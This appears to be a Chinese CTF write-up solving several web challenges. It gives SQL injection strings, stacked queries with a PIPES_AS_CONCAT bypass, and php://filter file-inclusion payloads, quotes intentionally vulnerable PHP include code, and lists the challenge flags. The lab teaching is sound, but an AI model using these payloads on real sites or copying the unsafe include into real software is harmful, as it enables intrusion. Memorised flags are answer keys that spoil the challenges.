## [极客大挑战 2019]EasySQL 1

```
没什么好说的，万能注入1'or 1=1 #
```





## [极客大挑战 2019]Havefun 1

查看源代码发现有

```html
   <!--
        $cat=$_GET['cat'];
        echo $cat;
        if($cat=='dog'){
            echo 'Syc{cat_cat_cat_cat}';
        }
        -->
```

直接?cat=dog





## [SUCTF 2019]EasySQL  1

```html


<html>
<head>
</head>

<body>

<a> Give me your flag, I will tell you if the flag is right. </a>
<form action="" method="post">
<input type="text" name="query">
<input type="submit">
</form>
</body>
</html>


```

看了源代码啥也没有，尝试注入一下，发现 or ,flag ,form等都被过滤了，尝试堆叠注入，` 1;show databases; `    

```php
Array ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test )
```

发现可以堆叠注入，有回显。然后查看表名` 1;show tables;# `

` Array ( [0] => 1 ) Array ( [0] => Flag ) ` 

上网查询发现原来代码是这样的` select $post['query']||flag from Flag `

那直接payload:`1,*` .

预期解payload：` 1;set sql_mode=PIPES_AS_CONCAT;select 1 `

拼接一下就是` select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag `

` sql_mode=PIPES_AS_CONCAT `的意思是 将 `||` 视为字符串的连接操作符而非 "或" 运算符 





## [ACTF2020 新生赛]Include 1

打开题目发现只有一个tips，点开以后什么也没有，查看网页源代码

```php+HTML
<meta charset="utf8">
<a href="?file=flag.php">tips</a>
```

首先尝试` php://input `，发现被过滤了

然后尝试` php://filter ` 伪协议来进行包含 

 构造Payload:
`?file=php://filter/read=convert.base64-encode/resource=flag.php` 

得到```PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MGNhMGU4YTItM2VmNi00YzZmLWEwN2YtMjMyODI3Yjc2NmJlfQo= ```

然后base64解码得到

```php
<?php
echo "Can you find out the flag?";
//flag{0ca0e8a2-3ef6-4c6f-a07f-232827b766be}
```



## [极客大挑战 2019]Secret File1

拿到题目，啥也没有，查看网页源代码

```php+HTML
<!DOCTYPE html>

<html>

<style type="text/css" >
#master {
    position:absolute;
    left:44%;
    bottom:0;
    text-align :center;
        }
        p,h1 {
                cursor: default;
        }
</style>

        <head>
                <meta charset="utf-8">
                <title>蒋璐源的秘密</title>
        </head>

        <body style="background-color:black;"><br><br><br><br><br><br>

            <h1 style="font-family:verdana;color:red;text-align:center;">你想知道蒋璐源的秘密么？</h1><br><br><br>

            <p style="font-family:arial;color:red;font-size:20px;text-align:center;">想要的话可以给你，去找吧！把一切都放在那里了！</p>
            <a id="master" href="./Archive_room.php" style="background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;">Oh! You found me</a>
            <div style="position: absolute;bottom: 0;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
        </body>
</html>
```

看到有一个./Archive_room.php的网页，点进去以后有一个`SECRET `的按钮，点了以后发现跳转到end.php，啥也没有，查看源码

```html

<!DOCTYPE html>

<html>

<style type="text/css" >
#master	{
    position:absolute;
    left:44%;
    bottom:20;
    text-align :center;
    	}
        p,h1 {
                cursor: default;
        }
</style>

	<head>
		<meta charset="utf-8">
		<title>绝密档案</title>
	</head>

	<body style="background-color:black;"><br><br><br><br><br><br>
		
		<h1 style="font-family:verdana;color:red;text-align:center;">
		我把他们都放在这里了，去看看吧		<br>
		</h1><br><br><br><br><br><br>
		<a id="master" href="./action.php" style="background-color:red;height:50px;width:200px;color:#FFFFFF;left:44%;">
			<font size=6>SECRET</font>
		</a>
	<div style="position: absolute;bottom: 0;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
	</body>

</html>

```

发现是action.php的网页，推测是时间很短，用Burpsuite抓包

```html
HTTP/1.1 302 Found
Server: openresty
Date: Wed, 05 May 2021 08:31:30 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Location: end.php
X-Powered-By: PHP/7.3.11
Content-Length: 63

<!DOCTYPE html>

<html>
<!--
   secr3t.php        
-->
</html>

```

发现返回了这个，打开secr3t.php网页，只有一串代码

```php+HTML
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>

```

打开flag.php，并没有东西。

查看secr3t.php发现过滤了../，tp等，尝试使用` php://filete `来获取文件。

payload：`secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php`

得到

```
PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7OTIzODQwNDctZWFlNS00YWQ2LWE3ZjUtODRiMTBhMjNkMWEwfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=
```

base64解码

```php+HTML
<!DOCTYPE html>

<html>

    <head>
        <meta charset="utf-8">
        <title>FLAG</title>
    </head>

    <body style="background-color:black;"><br><br><br><br><br><br>
        
        <h1 style="font-family:verdana;color:red;text-align:center;">啊哈！你找到我了！可是你看不到我QAQ~~~</h1><br><br><br>
        
        <p style="font-family:arial;color:red;font-size:20px;text-align:center;">
            <?php
                echo "我就在这里";
                $flag = 'flag{92384047-eae5-4ad6-a7f5-84b10a23d1a0}';
                $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'
            ?>
        </p>
    </body>

</html>

```



234